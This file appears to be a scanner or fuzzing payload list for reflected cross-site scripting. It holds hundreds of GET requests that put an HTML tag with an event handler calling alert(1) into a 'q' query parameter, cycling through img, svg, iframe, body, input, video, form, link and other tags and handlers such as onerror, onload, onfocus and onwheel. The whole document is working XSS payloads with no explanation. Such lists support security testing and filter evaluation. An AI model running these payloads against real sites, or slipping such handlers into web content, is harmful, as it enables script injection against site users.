+XSS	GET	/	q=<img src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<img onpointerover=alert(1)>				
+XSS	GET	/	q=<img/onpointerover=alert(1)>				
+XSS	GET	/	q=<img src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<img onwheel=alert(1)>				
+XSS	GET	/	q=<img/onwheel=alert(1)>				
+XSS	GET	/	q=<img src=x onwheel=alert(1)>				
+XSS	GET	/	q=<svg onerror=alert(1)>				
+XSS	GET	/	q=<svg/onerror=alert(1)>				
+XSS	GET	/	q=<svg src=x onerror=alert(1)>				
+XSS	GET	/	q=<svg src=x onload=alert(1)>				
+XSS	GET	/	q=<svg onfocus=alert(1)>				
+XSS	GET	/	q=<svg/onfocus=alert(1)>				
+XSS	GET	/	q=<svg src=x onfocus=alert(1)>				
+XSS	GET	/	q=<svg ontoggle=alert(1)>				
+XSS	GET	/	q=<svg/ontoggle=alert(1)>				
+XSS	GET	/	q=<svg src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<svg onmouseover=alert(1)>				
+XSS	GET	/	q=<svg/onmouseover=alert(1)>				
+XSS	GET	/	q=<svg src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<svg onclick=alert(1)>				
+XSS	GET	/	q=<svg/onclick=alert(1)>				
+XSS	GET	/	q=<svg src=x onclick=alert(1)>				
+XSS	GET	/	q=<svg onstart=alert(1)>				
+XSS	GET	/	q=<svg/onstart=alert(1)>				
+XSS	GET	/	q=<svg src=x onstart=alert(1)>				
+XSS	GET	/	q=<svg onbegin=alert(1)>				
+XSS	GET	/	q=<svg/onbegin=alert(1)>				
+XSS	GET	/	q=<svg src=x onbegin=alert(1)>				
+XSS	GET	/	q=<svg onanimationstart=alert(1)>				
+XSS	GET	/	q=<svg/onanimationstart=alert(1)>				
+XSS	GET	/	q=<svg src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<svg onpointerover=alert(1)>				
+XSS	GET	/	q=<svg/onpointerover=alert(1)>				
+XSS	GET	/	q=<svg src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<svg onwheel=alert(1)>				
+XSS	GET	/	q=<svg/onwheel=alert(1)>				
+XSS	GET	/	q=<svg src=x onwheel=alert(1)>				
+XSS	GET	/	q=<iframe onerror=alert(1)>				
+XSS	GET	/	q=<iframe/onerror=alert(1)>				
+XSS	GET	/	q=<iframe src=x onerror=alert(1)>				
+XSS	GET	/	q=<iframe onload=alert(1)>				
+XSS	GET	/	q=<iframe/onload=alert(1)>				
+XSS	GET	/	q=<iframe src=x onload=alert(1)>				
+XSS	GET	/	q=<iframe onfocus=alert(1)>				
+XSS	GET	/	q=<iframe/onfocus=alert(1)>				
+XSS	GET	/	q=<iframe src=x onfocus=alert(1)>				
+XSS	GET	/	q=<iframe ontoggle=alert(1)>				
+XSS	GET	/	q=<iframe/ontoggle=alert(1)>				
+XSS	GET	/	q=<iframe src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<iframe onmouseover=alert(1)>				
+XSS	GET	/	q=<iframe/onmouseover=alert(1)>				
+XSS	GET	/	q=<iframe src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<iframe onclick=alert(1)>				
+XSS	GET	/	q=<iframe/onclick=alert(1)>				
+XSS	GET	/	q=<iframe src=x onclick=alert(1)>				
+XSS	GET	/	q=<iframe onstart=alert(1)>				
+XSS	GET	/	q=<iframe/onstart=alert(1)>				
+XSS	GET	/	q=<iframe src=x onstart=alert(1)>				
+XSS	GET	/	q=<iframe onbegin=alert(1)>				
+XSS	GET	/	q=<iframe/onbegin=alert(1)>				
+XSS	GET	/	q=<iframe src=x onbegin=alert(1)>				
+XSS	GET	/	q=<iframe onanimationstart=alert(1)>				
+XSS	GET	/	q=<iframe/onanimationstart=alert(1)>				
+XSS	GET	/	q=<iframe src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<iframe onpointerover=alert(1)>				
+XSS	GET	/	q=<iframe/onpointerover=alert(1)>				
+XSS	GET	/	q=<iframe src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<iframe onwheel=alert(1)>				
+XSS	GET	/	q=<iframe/onwheel=alert(1)>				
+XSS	GET	/	q=<iframe src=x onwheel=alert(1)>				
+XSS	GET	/	q=<body onerror=alert(1)>				
+XSS	GET	/	q=<body/onerror=alert(1)>				
+XSS	GET	/	q=<body src=x onerror=alert(1)>				
+XSS	GET	/	q=<body src=x onload=alert(1)>				
+XSS	GET	/	q=<body onfocus=alert(1)>				
+XSS	GET	/	q=<body/onfocus=alert(1)>				
+XSS	GET	/	q=<body src=x onfocus=alert(1)>				
+XSS	GET	/	q=<body ontoggle=alert(1)>				
+XSS	GET	/	q=<body/ontoggle=alert(1)>				
+XSS	GET	/	q=<body src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<body onmouseover=alert(1)>				
+XSS	GET	/	q=<body/onmouseover=alert(1)>				
+XSS	GET	/	q=<body src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<body onclick=alert(1)>				
+XSS	GET	/	q=<body/onclick=alert(1)>				
+XSS	GET	/	q=<body src=x onclick=alert(1)>				
+XSS	GET	/	q=<body onstart=alert(1)>				
+XSS	GET	/	q=<body/onstart=alert(1)>				
+XSS	GET	/	q=<body src=x onstart=alert(1)>				
+XSS	GET	/	q=<body onbegin=alert(1)>				
+XSS	GET	/	q=<body/onbegin=alert(1)>				
+XSS	GET	/	q=<body src=x onbegin=alert(1)>				
+XSS	GET	/	q=<body onanimationstart=alert(1)>				
+XSS	GET	/	q=<body/onanimationstart=alert(1)>				
+XSS	GET	/	q=<body src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<body onpointerover=alert(1)>				
+XSS	GET	/	q=<body/onpointerover=alert(1)>				
+XSS	GET	/	q=<body src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<body onwheel=alert(1)>				
+XSS	GET	/	q=<body/onwheel=alert(1)>				
+XSS	GET	/	q=<body src=x onwheel=alert(1)>				
+XSS	GET	/	q=<input onerror=alert(1)>				
+XSS	GET	/	q=<input/onerror=alert(1)>				
+XSS	GET	/	q=<input src=x onerror=alert(1)>				
+XSS	GET	/	q=<input onload=alert(1)>				
+XSS	GET	/	q=<input/onload=alert(1)>				
+XSS	GET	/	q=<input src=x onload=alert(1)>				
+XSS	GET	/	q=<input onfocus=alert(1)>				
+XSS	GET	/	q=<input/onfocus=alert(1)>				
+XSS	GET	/	q=<input src=x onfocus=alert(1)>				
+XSS	GET	/	q=<input ontoggle=alert(1)>				
+XSS	GET	/	q=<input/ontoggle=alert(1)>				
+XSS	GET	/	q=<input src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<input onmouseover=alert(1)>				
+XSS	GET	/	q=<input/onmouseover=alert(1)>				
+XSS	GET	/	q=<input src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<input onclick=alert(1)>				
+XSS	GET	/	q=<input/onclick=alert(1)>				
+XSS	GET	/	q=<input src=x onclick=alert(1)>				
+XSS	GET	/	q=<input onstart=alert(1)>				
+XSS	GET	/	q=<input/onstart=alert(1)>				
+XSS	GET	/	q=<input src=x onstart=alert(1)>				
+XSS	GET	/	q=<input onbegin=alert(1)>				
+XSS	GET	/	q=<input/onbegin=alert(1)>				
+XSS	GET	/	q=<input src=x onbegin=alert(1)>				
+XSS	GET	/	q=<input onanimationstart=alert(1)>				
+XSS	GET	/	q=<input/onanimationstart=alert(1)>				
+XSS	GET	/	q=<input src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<input onpointerover=alert(1)>				
+XSS	GET	/	q=<input/onpointerover=alert(1)>				
+XSS	GET	/	q=<input src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<input onwheel=alert(1)>				
+XSS	GET	/	q=<input/onwheel=alert(1)>				
+XSS	GET	/	q=<input src=x onwheel=alert(1)>				
+XSS	GET	/	q=<details onerror=alert(1)>				
+XSS	GET	/	q=<details/onerror=alert(1)>				
+XSS	GET	/	q=<details src=x onerror=alert(1)>				
+XSS	GET	/	q=<details onload=alert(1)>				
+XSS	GET	/	q=<details/onload=alert(1)>				
+XSS	GET	/	q=<details src=x onload=alert(1)>				
+XSS	GET	/	q=<details onfocus=alert(1)>				
+XSS	GET	/	q=<details/onfocus=alert(1)>				
+XSS	GET	/	q=<details src=x onfocus=alert(1)>				
+XSS	GET	/	q=<details ontoggle=alert(1)>				
+XSS	GET	/	q=<details/ontoggle=alert(1)>				
+XSS	GET	/	q=<details src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<details onmouseover=alert(1)>				
+XSS	GET	/	q=<details/onmouseover=alert(1)>				
+XSS	GET	/	q=<details src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<details onclick=alert(1)>				
+XSS	GET	/	q=<details/onclick=alert(1)>				
+XSS	GET	/	q=<details src=x onclick=alert(1)>				
+XSS	GET	/	q=<details onstart=alert(1)>				
+XSS	GET	/	q=<details/onstart=alert(1)>				
+XSS	GET	/	q=<details src=x onstart=alert(1)>				
+XSS	GET	/	q=<details onbegin=alert(1)>				
+XSS	GET	/	q=<details/onbegin=alert(1)>				
+XSS	GET	/	q=<details src=x onbegin=alert(1)>				
+XSS	GET	/	q=<details onanimationstart=alert(1)>				
+XSS	GET	/	q=<details/onanimationstart=alert(1)>				
+XSS	GET	/	q=<details src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<details onpointerover=alert(1)>				
+XSS	GET	/	q=<details/onpointerover=alert(1)>				
+XSS	GET	/	q=<details src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<details onwheel=alert(1)>				
+XSS	GET	/	q=<details/onwheel=alert(1)>				
+XSS	GET	/	q=<details src=x onwheel=alert(1)>				
+XSS	GET	/	q=<video onerror=alert(1)>				
+XSS	GET	/	q=<video/onerror=alert(1)>				
+XSS	GET	/	q=<video src=x onerror=alert(1)>				
+XSS	GET	/	q=<video onload=alert(1)>				
+XSS	GET	/	q=<video/onload=alert(1)>				
+XSS	GET	/	q=<video src=x onload=alert(1)>				
+XSS	GET	/	q=<video onfocus=alert(1)>				
+XSS	GET	/	q=<video/onfocus=alert(1)>				
+XSS	GET	/	q=<video src=x onfocus=alert(1)>				
+XSS	GET	/	q=<video ontoggle=alert(1)>				
+XSS	GET	/	q=<video/ontoggle=alert(1)>				
+XSS	GET	/	q=<video src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<video onmouseover=alert(1)>				
+XSS	GET	/	q=<video/onmouseover=alert(1)>				
+XSS	GET	/	q=<video src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<video onclick=alert(1)>				
+XSS	GET	/	q=<video/onclick=alert(1)>				
+XSS	GET	/	q=<video src=x onclick=alert(1)>				
+XSS	GET	/	q=<video onstart=alert(1)>				
+XSS	GET	/	q=<video/onstart=alert(1)>				
+XSS	GET	/	q=<video src=x onstart=alert(1)>				
+XSS	GET	/	q=<video onbegin=alert(1)>				
+XSS	GET	/	q=<video/onbegin=alert(1)>				
+XSS	GET	/	q=<video src=x onbegin=alert(1)>				
+XSS	GET	/	q=<video onanimationstart=alert(1)>				
+XSS	GET	/	q=<video/onanimationstart=alert(1)>				
+XSS	GET	/	q=<video src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<video onpointerover=alert(1)>				
+XSS	GET	/	q=<video/onpointerover=alert(1)>				
+XSS	GET	/	q=<video src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<video onwheel=alert(1)>				
+XSS	GET	/	q=<video/onwheel=alert(1)>				
+XSS	GET	/	q=<video src=x onwheel=alert(1)>				
+XSS	GET	/	q=<audio onerror=alert(1)>				
+XSS	GET	/	q=<audio/onerror=alert(1)>				
+XSS	GET	/	q=<audio onload=alert(1)>				
+XSS	GET	/	q=<audio/onload=alert(1)>				
+XSS	GET	/	q=<audio src=x onload=alert(1)>				
+XSS	GET	/	q=<audio onfocus=alert(1)>				
+XSS	GET	/	q=<audio/onfocus=alert(1)>				
+XSS	GET	/	q=<audio src=x onfocus=alert(1)>				
+XSS	GET	/	q=<audio ontoggle=alert(1)>				
+XSS	GET	/	q=<audio/ontoggle=alert(1)>				
+XSS	GET	/	q=<audio src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<audio onmouseover=alert(1)>				
+XSS	GET	/	q=<audio/onmouseover=alert(1)>				
+XSS	GET	/	q=<audio src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<audio onclick=alert(1)>				
+XSS	GET	/	q=<audio/onclick=alert(1)>				
+XSS	GET	/	q=<audio src=x onclick=alert(1)>				
+XSS	GET	/	q=<audio onstart=alert(1)>				
+XSS	GET	/	q=<audio/onstart=alert(1)>				
+XSS	GET	/	q=<audio src=x onstart=alert(1)>				
+XSS	GET	/	q=<audio onbegin=alert(1)>				
+XSS	GET	/	q=<audio/onbegin=alert(1)>				
+XSS	GET	/	q=<audio src=x onbegin=alert(1)>				
+XSS	GET	/	q=<audio onanimationstart=alert(1)>				
+XSS	GET	/	q=<audio/onanimationstart=alert(1)>				
+XSS	GET	/	q=<audio src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<audio onpointerover=alert(1)>				
+XSS	GET	/	q=<audio/onpointerover=alert(1)>				
+XSS	GET	/	q=<audio src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<audio onwheel=alert(1)>				
+XSS	GET	/	q=<audio/onwheel=alert(1)>				
+XSS	GET	/	q=<audio src=x onwheel=alert(1)>				
+XSS	GET	/	q=<marquee onerror=alert(1)>				
+XSS	GET	/	q=<marquee/onerror=alert(1)>				
+XSS	GET	/	q=<marquee src=x onerror=alert(1)>				
+XSS	GET	/	q=<marquee onload=alert(1)>				
+XSS	GET	/	q=<marquee/onload=alert(1)>				
+XSS	GET	/	q=<marquee src=x onload=alert(1)>				
+XSS	GET	/	q=<marquee onfocus=alert(1)>				
+XSS	GET	/	q=<marquee/onfocus=alert(1)>				
+XSS	GET	/	q=<marquee src=x onfocus=alert(1)>				
+XSS	GET	/	q=<marquee ontoggle=alert(1)>				
+XSS	GET	/	q=<marquee/ontoggle=alert(1)>				
+XSS	GET	/	q=<marquee src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<marquee onmouseover=alert(1)>				
+XSS	GET	/	q=<marquee/onmouseover=alert(1)>				
+XSS	GET	/	q=<marquee src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<marquee onclick=alert(1)>				
+XSS	GET	/	q=<marquee/onclick=alert(1)>				
+XSS	GET	/	q=<marquee src=x onclick=alert(1)>				
+XSS	GET	/	q=<marquee/onstart=alert(1)>				
+XSS	GET	/	q=<marquee src=x onstart=alert(1)>				
+XSS	GET	/	q=<marquee onbegin=alert(1)>				
+XSS	GET	/	q=<marquee/onbegin=alert(1)>				
+XSS	GET	/	q=<marquee src=x onbegin=alert(1)>				
+XSS	GET	/	q=<marquee onanimationstart=alert(1)>				
+XSS	GET	/	q=<marquee/onanimationstart=alert(1)>				
+XSS	GET	/	q=<marquee src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<marquee onpointerover=alert(1)>				
+XSS	GET	/	q=<marquee/onpointerover=alert(1)>				
+XSS	GET	/	q=<marquee src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<marquee onwheel=alert(1)>				
+XSS	GET	/	q=<marquee/onwheel=alert(1)>				
+XSS	GET	/	q=<marquee src=x onwheel=alert(1)>				
+XSS	GET	/	q=<object onerror=alert(1)>				
+XSS	GET	/	q=<object/onerror=alert(1)>				
+XSS	GET	/	q=<object src=x onerror=alert(1)>				
+XSS	GET	/	q=<object onload=alert(1)>				
+XSS	GET	/	q=<object/onload=alert(1)>				
+XSS	GET	/	q=<object src=x onload=alert(1)>				
+XSS	GET	/	q=<object onfocus=alert(1)>				
+XSS	GET	/	q=<object/onfocus=alert(1)>				
+XSS	GET	/	q=<object src=x onfocus=alert(1)>				
+XSS	GET	/	q=<object ontoggle=alert(1)>				
+XSS	GET	/	q=<object/ontoggle=alert(1)>				
+XSS	GET	/	q=<object src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<object onmouseover=alert(1)>				
+XSS	GET	/	q=<object/onmouseover=alert(1)>				
+XSS	GET	/	q=<object src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<object onclick=alert(1)>				
+XSS	GET	/	q=<object/onclick=alert(1)>				
+XSS	GET	/	q=<object src=x onclick=alert(1)>				
+XSS	GET	/	q=<object onstart=alert(1)>				
+XSS	GET	/	q=<object/onstart=alert(1)>				
+XSS	GET	/	q=<object src=x onstart=alert(1)>				
+XSS	GET	/	q=<object onbegin=alert(1)>				
+XSS	GET	/	q=<object/onbegin=alert(1)>				
+XSS	GET	/	q=<object src=x onbegin=alert(1)>				
+XSS	GET	/	q=<object onanimationstart=alert(1)>				
+XSS	GET	/	q=<object/onanimationstart=alert(1)>				
+XSS	GET	/	q=<object src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<object onpointerover=alert(1)>				
+XSS	GET	/	q=<object/onpointerover=alert(1)>				
+XSS	GET	/	q=<object src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<object onwheel=alert(1)>				
+XSS	GET	/	q=<object/onwheel=alert(1)>				
+XSS	GET	/	q=<object src=x onwheel=alert(1)>				
+XSS	GET	/	q=<embed onerror=alert(1)>				
+XSS	GET	/	q=<embed/onerror=alert(1)>				
+XSS	GET	/	q=<embed src=x onerror=alert(1)>				
+XSS	GET	/	q=<embed onload=alert(1)>				
+XSS	GET	/	q=<embed/onload=alert(1)>				
+XSS	GET	/	q=<embed src=x onload=alert(1)>				
+XSS	GET	/	q=<embed onfocus=alert(1)>				
+XSS	GET	/	q=<embed/onfocus=alert(1)>				
+XSS	GET	/	q=<embed src=x onfocus=alert(1)>				
+XSS	GET	/	q=<embed ontoggle=alert(1)>				
+XSS	GET	/	q=<embed/ontoggle=alert(1)>				
+XSS	GET	/	q=<embed src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<embed onmouseover=alert(1)>				
+XSS	GET	/	q=<embed/onmouseover=alert(1)>				
+XSS	GET	/	q=<embed src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<embed onclick=alert(1)>				
+XSS	GET	/	q=<embed/onclick=alert(1)>				
+XSS	GET	/	q=<embed src=x onclick=alert(1)>				
+XSS	GET	/	q=<embed onstart=alert(1)>				
+XSS	GET	/	q=<embed/onstart=alert(1)>				
+XSS	GET	/	q=<embed src=x onstart=alert(1)>				
+XSS	GET	/	q=<embed onbegin=alert(1)>				
+XSS	GET	/	q=<embed/onbegin=alert(1)>				
+XSS	GET	/	q=<embed src=x onbegin=alert(1)>				
+XSS	GET	/	q=<embed onanimationstart=alert(1)>				
+XSS	GET	/	q=<embed/onanimationstart=alert(1)>				
+XSS	GET	/	q=<embed src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<embed onpointerover=alert(1)>				
+XSS	GET	/	q=<embed/onpointerover=alert(1)>				
+XSS	GET	/	q=<embed src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<embed onwheel=alert(1)>				
+XSS	GET	/	q=<embed/onwheel=alert(1)>				
+XSS	GET	/	q=<embed src=x onwheel=alert(1)>				
+XSS	GET	/	q=<form onerror=alert(1)>				
+XSS	GET	/	q=<form/onerror=alert(1)>				
+XSS	GET	/	q=<form src=x onerror=alert(1)>				
+XSS	GET	/	q=<form onload=alert(1)>				
+XSS	GET	/	q=<form/onload=alert(1)>				
+XSS	GET	/	q=<form src=x onload=alert(1)>				
+XSS	GET	/	q=<form onfocus=alert(1)>				
+XSS	GET	/	q=<form/onfocus=alert(1)>				
+XSS	GET	/	q=<form src=x onfocus=alert(1)>				
+XSS	GET	/	q=<form ontoggle=alert(1)>				
+XSS	GET	/	q=<form/ontoggle=alert(1)>				
+XSS	GET	/	q=<form src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<form onmouseover=alert(1)>				
+XSS	GET	/	q=<form/onmouseover=alert(1)>				
+XSS	GET	/	q=<form src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<form onclick=alert(1)>				
+XSS	GET	/	q=<form/onclick=alert(1)>				
+XSS	GET	/	q=<form src=x onclick=alert(1)>				
+XSS	GET	/	q=<form onstart=alert(1)>				
+XSS	GET	/	q=<form/onstart=alert(1)>				
+XSS	GET	/	q=<form src=x onstart=alert(1)>				
+XSS	GET	/	q=<form onbegin=alert(1)>				
+XSS	GET	/	q=<form/onbegin=alert(1)>				
+XSS	GET	/	q=<form src=x onbegin=alert(1)>				
+XSS	GET	/	q=<form onanimationstart=alert(1)>				
+XSS	GET	/	q=<form/onanimationstart=alert(1)>				
+XSS	GET	/	q=<form src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<form onpointerover=alert(1)>				
+XSS	GET	/	q=<form/onpointerover=alert(1)>				
+XSS	GET	/	q=<form src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<form onwheel=alert(1)>				
+XSS	GET	/	q=<form/onwheel=alert(1)>				
+XSS	GET	/	q=<form src=x onwheel=alert(1)>				
+XSS	GET	/	q=<math onerror=alert(1)>				
+XSS	GET	/	q=<math/onerror=alert(1)>				
+XSS	GET	/	q=<math src=x onerror=alert(1)>				
+XSS	GET	/	q=<math onload=alert(1)>				
+XSS	GET	/	q=<math/onload=alert(1)>				
+XSS	GET	/	q=<math src=x onload=alert(1)>				
+XSS	GET	/	q=<math onfocus=alert(1)>				
+XSS	GET	/	q=<math/onfocus=alert(1)>				
+XSS	GET	/	q=<math src=x onfocus=alert(1)>				
+XSS	GET	/	q=<math ontoggle=alert(1)>				
+XSS	GET	/	q=<math/ontoggle=alert(1)>				
+XSS	GET	/	q=<math src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<math onmouseover=alert(1)>				
+XSS	GET	/	q=<math/onmouseover=alert(1)>				
+XSS	GET	/	q=<math src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<math onclick=alert(1)>				
+XSS	GET	/	q=<math/onclick=alert(1)>				
+XSS	GET	/	q=<math src=x onclick=alert(1)>				
+XSS	GET	/	q=<math onstart=alert(1)>				
+XSS	GET	/	q=<math/onstart=alert(1)>				
+XSS	GET	/	q=<math src=x onstart=alert(1)>				
+XSS	GET	/	q=<math onbegin=alert(1)>				
+XSS	GET	/	q=<math/onbegin=alert(1)>				
+XSS	GET	/	q=<math src=x onbegin=alert(1)>				
+XSS	GET	/	q=<math onanimationstart=alert(1)>				
+XSS	GET	/	q=<math/onanimationstart=alert(1)>				
+XSS	GET	/	q=<math src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<math onpointerover=alert(1)>				
+XSS	GET	/	q=<math/onpointerover=alert(1)>				
+XSS	GET	/	q=<math src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<math onwheel=alert(1)>				
+XSS	GET	/	q=<math/onwheel=alert(1)>				
+XSS	GET	/	q=<math src=x onwheel=alert(1)>				
+XSS	GET	/	q=<template onerror=alert(1)>				
+XSS	GET	/	q=<template/onerror=alert(1)>				
+XSS	GET	/	q=<template src=x onerror=alert(1)>				
+XSS	GET	/	q=<template onload=alert(1)>				
+XSS	GET	/	q=<template/onload=alert(1)>				
+XSS	GET	/	q=<template src=x onload=alert(1)>				
+XSS	GET	/	q=<template onfocus=alert(1)>				
+XSS	GET	/	q=<template/onfocus=alert(1)>				
+XSS	GET	/	q=<template src=x onfocus=alert(1)>				
+XSS	GET	/	q=<template ontoggle=alert(1)>				
+XSS	GET	/	q=<template/ontoggle=alert(1)>				
+XSS	GET	/	q=<template src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<template onmouseover=alert(1)>				
+XSS	GET	/	q=<template/onmouseover=alert(1)>				
+XSS	GET	/	q=<template src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<template onclick=alert(1)>				
+XSS	GET	/	q=<template/onclick=alert(1)>				
+XSS	GET	/	q=<template src=x onclick=alert(1)>				
+XSS	GET	/	q=<template onstart=alert(1)>				
+XSS	GET	/	q=<template/onstart=alert(1)>				
+XSS	GET	/	q=<template src=x onstart=alert(1)>				
+XSS	GET	/	q=<template onbegin=alert(1)>				
+XSS	GET	/	q=<template/onbegin=alert(1)>				
+XSS	GET	/	q=<template src=x onbegin=alert(1)>				
+XSS	GET	/	q=<template onanimationstart=alert(1)>				
+XSS	GET	/	q=<template/onanimationstart=alert(1)>				
+XSS	GET	/	q=<template src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<template onpointerover=alert(1)>				
+XSS	GET	/	q=<template/onpointerover=alert(1)>				
+XSS	GET	/	q=<template src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<template onwheel=alert(1)>				
+XSS	GET	/	q=<template/onwheel=alert(1)>				
+XSS	GET	/	q=<template src=x onwheel=alert(1)>				
+XSS	GET	/	q=<style onerror=alert(1)>				
+XSS	GET	/	q=<style/onerror=alert(1)>				
+XSS	GET	/	q=<style src=x onerror=alert(1)>				
+XSS	GET	/	q=<style onload=alert(1)>				
+XSS	GET	/	q=<style/onload=alert(1)>				
+XSS	GET	/	q=<style src=x onload=alert(1)>				
+XSS	GET	/	q=<style onfocus=alert(1)>				
+XSS	GET	/	q=<style/onfocus=alert(1)>				
+XSS	GET	/	q=<style src=x onfocus=alert(1)>				
+XSS	GET	/	q=<style ontoggle=alert(1)>				
+XSS	GET	/	q=<style/ontoggle=alert(1)>				
+XSS	GET	/	q=<style src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<style onmouseover=alert(1)>				
+XSS	GET	/	q=<style/onmouseover=alert(1)>				
+XSS	GET	/	q=<style src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<style onclick=alert(1)>				
+XSS	GET	/	q=<style/onclick=alert(1)>				
+XSS	GET	/	q=<style src=x onclick=alert(1)>				
+XSS	GET	/	q=<style onstart=alert(1)>				
+XSS	GET	/	q=<style/onstart=alert(1)>				
+XSS	GET	/	q=<style src=x onstart=alert(1)>				
+XSS	GET	/	q=<style onbegin=alert(1)>				
+XSS	GET	/	q=<style/onbegin=alert(1)>				
+XSS	GET	/	q=<style src=x onbegin=alert(1)>				
+XSS	GET	/	q=<style onanimationstart=alert(1)>				
+XSS	GET	/	q=<style/onanimationstart=alert(1)>				
+XSS	GET	/	q=<style src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<style onpointerover=alert(1)>				
+XSS	GET	/	q=<style/onpointerover=alert(1)>				
+XSS	GET	/	q=<style src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<style onwheel=alert(1)>				
+XSS	GET	/	q=<style/onwheel=alert(1)>				
+XSS	GET	/	q=<style src=x onwheel=alert(1)>				
+XSS	GET	/	q=<link onerror=alert(1)>				
+XSS	GET	/	q=<link/onerror=alert(1)>				
+XSS	GET	/	q=<link src=x onerror=alert(1)>				
+XSS	GET	/	q=<link onload=alert(1)>				
+XSS	GET	/	q=<link/onload=alert(1)>				
+XSS	GET	/	q=<link src=x onload=alert(1)>				
+XSS	GET	/	q=<link onfocus=alert(1)>				
+XSS	GET	/	q=<link/onfocus=alert(1)>				
+XSS	GET	/	q=<link src=x onfocus=alert(1)>				
+XSS	GET	/	q=<link ontoggle=alert(1)>				
+XSS	GET	/	q=<link/ontoggle=alert(1)>				
+XSS	GET	/	q=<link src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<link onmouseover=alert(1)>				
+XSS	GET	/	q=<link/onmouseover=alert(1)>				
+XSS	GET	/	q=<link src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<link onclick=alert(1)>				
+XSS	GET	/	q=<link/onclick=alert(1)>				
+XSS	GET	/	q=<link src=x onclick=alert(1)>				
+XSS	GET	/	q=<link onstart=alert(1)>				
+XSS	GET	/	q=<link/onstart=alert(1)>				
+XSS	GET	/	q=<link src=x onstart=alert(1)>				
+XSS	GET	/	q=<link onbegin=alert(1)>				
+XSS	GET	/	q=<link/onbegin=alert(1)>				
+XSS	GET	/	q=<link src=x onbegin=alert(1)>				
+XSS	GET	/	q=<link onanimationstart=alert(1)>				
+XSS	GET	/	q=<link/onanimationstart=alert(1)>				
+XSS	GET	/	q=<link src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<link onpointerover=alert(1)>				
+XSS	GET	/	q=<link/onpointerover=alert(1)>				
+XSS	GET	/	q=<link src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<link onwheel=alert(1)>				
+XSS	GET	/	q=<link/onwheel=alert(1)>				
+XSS	GET	/	q=<link src=x onwheel=alert(1)>				
+XSS	GET	/	q=<a onerror=alert(1)>				
+XSS	GET	/	q=<a/onerror=alert(1)>				
+XSS	GET	/	q=<a src=x onerror=alert(1)>				
+XSS	GET	/	q=<a onload=alert(1)>				
+XSS	GET	/	q=<a/onload=alert(1)>				
+XSS	GET	/	q=<a src=x onload=alert(1)>				
+XSS	GET	/	q=<a onfocus=alert(1)>				
+XSS	GET	/	q=<a/onfocus=alert(1)>				
+XSS	GET	/	q=<a src=x onfocus=alert(1)>				
+XSS	GET	/	q=<a ontoggle=alert(1)>				
+XSS	GET	/	q=<a/ontoggle=alert(1)>				
+XSS	GET	/	q=<a src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<a onmouseover=alert(1)>				
+XSS	GET	/	q=<a/onmouseover=alert(1)>				
+XSS	GET	/	q=<a src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<a onclick=alert(1)>				
+XSS	GET	/	q=<a/onclick=alert(1)>				
+XSS	GET	/	q=<a src=x onclick=alert(1)>				
+XSS	GET	/	q=<a onstart=alert(1)>				
+XSS	GET	/	q=<a/onstart=alert(1)>				
+XSS	GET	/	q=<a src=x onstart=alert(1)>				
+XSS	GET	/	q=<a onbegin=alert(1)>				
+XSS	GET	/	q=<a/onbegin=alert(1)>				
+XSS	GET	/	q=<a src=x onbegin=alert(1)>				
+XSS	GET	/	q=<a onanimationstart=alert(1)>				
